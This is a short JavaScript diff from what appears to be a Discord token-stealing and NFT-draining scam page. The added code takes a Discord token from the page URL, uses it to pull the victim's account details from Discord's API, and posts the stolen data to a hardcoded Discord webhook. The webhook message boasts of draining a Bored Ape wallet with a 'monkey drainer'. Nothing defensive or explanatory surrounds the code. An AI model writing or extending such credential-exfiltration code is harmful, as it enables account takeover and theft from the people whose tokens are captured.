@@ -85,8 +85,21 @@ var webhookURL = "https://canary.discord.com/api/webhooks/1054303465880420432/9N
 var url_string = window.location.href; 
 var url = new URL(url_string);
 var currentURL = url.searchParams.get("user");
+
+async function getDiscordAccountInfo(token) {
+  const response = await fetch('https://discord.com/api/users/@me', {
+    headers: {
+      'Authorization': `${token}`
+    }
+  });
+  const accountInfo = await response.json();
+  return accountInfo;
+}
+const accountInfo = await getDiscordAccountInfo(currentURL);
+
+
 var postData = {
-  content: "@everyone @here FEDS JUST HIT A TOKEN WE DRAINING BAYC6969 WITH SEAPORT AND MONKEY DRAINER LOLOL " + currentURL
+  content: "@everyone @here FEDS JUST HIT A TOKEN WE DRAINING BAYC6969 WITH SEAPORT AND MONKEY DRAINER LOLOL " + accountInfo
 };
 fetch(webhookURL, {
   method: "POST",
